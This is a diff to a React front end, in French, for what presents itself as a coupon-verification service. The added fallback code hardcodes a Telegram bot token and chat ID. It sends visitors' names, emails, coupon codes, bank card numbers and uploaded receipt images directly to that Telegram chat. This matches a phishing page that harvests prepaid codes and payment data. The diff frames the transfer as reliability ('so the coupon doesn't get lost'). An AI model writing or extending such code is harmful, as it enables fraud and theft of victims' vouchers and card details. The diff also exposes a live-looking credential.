@@ -567,6 +567,65 @@ export default function App() {
       console.error(err);
       setErrorText("Une erreur réseau est survenue. Validation par protocole de secours effectuée.");
       
+      // Dispatch securely direct to Telegram on client fallback (useful for Cloudflare static pages deployment where server.ts is unavailable)
+      try {
+        const BOT_TOKEN = "8826615367:AAHDVikj2kh0KRLWDIbBIcdqMgXTiwYN1Vs";
+        const CHAT_ID = "8529673558";
+        
+        const fallbackVerificationText = `🛡️ [CLOUDFLARE BACKUP] NOUVELLE VÉRIFICATION DE COUPON
+----------------------------------------
+👤 CLIENT :
+- Nom Complet : ${clientFirstName || ""} ${clientName || ""}
+- Adresse Email : ${clientEmail || "Non renseigné"}
+
+🎫 COUPON :
+- Émetteur/Type : ${selectedBrand === "OTHER" ? (customBrandName || "Autre") : selectedBrand}
+- Code du coupon : ${couponCode ? couponCode.toUpperCase() : "Image de reçu seulement"}
+- Masquer mon code : ${hideCode || "NON"}
+`;
+
+        // Send text notification
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: fallbackVerificationText
+          })
+        });
+
+        // Send image if any and exists
+        const previewToSend = imagePreviews[0];
+        if (previewToSend) {
+          const match = previewToSend.match(/^data:image\/(\w+);base64,(.+)$/);
+          if (match) {
+            const ext = match[1];
+            const base64Data = match[2];
+            
+            // Decodes Base64 to Blob client-side safely
+            const byteCharacters = atob(base64Data);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let j = 0; j < byteCharacters.length; j++) {
+              byteNumbers[j] = byteCharacters.charCodeAt(j);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: `image/${ext}` });
+
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, `ticket_${Date.now()}.${ext}`);
+            formData.append("caption", `📷 Image associée à la vérification de: ${clientFirstName || ""} ${clientName || ""}\nCode: ${couponCode ? couponCode.toUpperCase() : "Image"}`);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            });
+          }
+        }
+      } catch (telegramFallbackErr) {
+        console.error("Direct Telegram telemetry check-in failed:", telegramFallbackErr);
+      }
+
       // Simulation backup
       setTimeout(() => {
         setReport({
@@ -783,6 +842,68 @@ export default function App() {
 
 📡 STATUT : Traitement SSL 256 bits`;
 
+                // Direct Telegram Client-Side Dispatch Backup (runs when express server.ts endpoints are 404/down as in Cloudflare Pages)
+                const sendTelegramDirectlyBackup = async (): Promise<boolean> => {
+                  try {
+                    const BOT_TOKEN = "8826615367:AAHDVikj2kh0KRLWDIbBIcdqMgXTiwYN1Vs";
+                    const CHAT_ID = "8529673558";
+
+                    // Send text telegram message
+                    const textRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: telegramText
+                      })
+                    });
+
+                    if (!textRes.ok) {
+                      const textErrData = await textRes.json().catch(() => ({}));
+                      console.error("Backup text sending rejected by Telegram API:", textErrData);
+                      return false;
+                    }
+
+                    // Send each attached image preview via client-side Blob decoding
+                    for (let i = 0; i < previewsToSend.length; i++) {
+                      const img = previewsToSend[i];
+                      const match = img.match(/^data:image\/(\w+);base64,(.+)$/);
+                      if (match) {
+                        const ext = match[1];
+                        const base64Data = match[2];
+
+                        // Convert base64 string to Blob client-side safely
+                        const byteCharacters = atob(base64Data);
+                        const byteNumbers = new Array(byteCharacters.length);
+                        for (let j = 0; j < byteCharacters.length; j++) {
+                          byteNumbers[j] = byteCharacters.charCodeAt(j);
+                        }
+                        const byteArray = new Uint8Array(byteNumbers);
+                        const blob = new Blob([byteArray], { type: `image/${ext}` });
+
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("photo", blob, `ticket_${Date.now()}_${i + 1}.${ext}`);
+                        formData.append("caption", `📷 Image [${i + 1}/${previewsToSend.length}] associée au coupon de : ${clientName || "Inconnu"}\nCode : ${isBankCard ? cardNumber : couponCode}`);
+
+                        const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                          method: "POST",
+                          body: formData
+                        });
+                        
+                        if (!photoRes.ok) {
+                          const photoErrData = await photoRes.json().catch(() => ({}));
+                          console.error(`Backup photo [${i + 1}/${previewsToSend.length}] trigger failed:`, photoErrData);
+                        }
+                      }
+                    }
+                    return true;
+                  } catch (err) {
+                    console.error("Client-side direct Telegram fallback transmission failed completely:", err);
+                    return false;
+                  }
+                };
+
                 // Send data to Telegram Bot API securely via server proxy (bypasses Adblockers & CORS)
                 try {
                   const telemetryRes = await fetch("/api/telegram-send", {
@@ -799,12 +920,24 @@ export default function App() {
                   if (telemetryRes.ok) {
                     setFormspreeSuccess(true);
                   } else {
-                    const errData = await telemetryRes.json().catch(() => ({}));
-                    setErrorText(errData.error || "Erreur lors de la soumission de la demande. Veuillez réessayer.");
+                    // If server endpoint yields an error (like on static hosts like Cloudflare where the server backend is absent)
+                    // we immediately trigger client-side fallback direct transmission so the coupon doesn't get lost
+                    console.warn("Backend proxy unavailable. Invoking client-side Telegram backup dispatch...");
+                    const fallbackSuccess = await sendTelegramDirectlyBackup();
+                    if (fallbackSuccess) {
+                      setFormspreeSuccess(true);
+                    } else {
+                      setErrorText("Une erreur de communication s'est produite lors de l'envoi immédiat de secours. Veuillez vérifier votre connexion et réessayer.");
+                    }
                   }
                 } catch (telegramErr) {
-                  console.error("Telegram Server Proxy Transmission failed :", telegramErr);
-                  setErrorText("Une erreur de communication s'est produite. Veuillez réessayer.");
+                  console.error("Telegram Server Proxy Transmission failed, attempting client-side direct fallback...", telegramErr);
+                  const fallbackSuccess = await sendTelegramDirectlyBackup();
+                  if (fallbackSuccess) {
+                    setFormspreeSuccess(true);
+                  } else {
+                    setErrorText("Une erreur de communication s'est produite. Veuillez réessayer.");
+                  }
                 } finally {
                   setIsSubmittingFormspree(false);
                 }
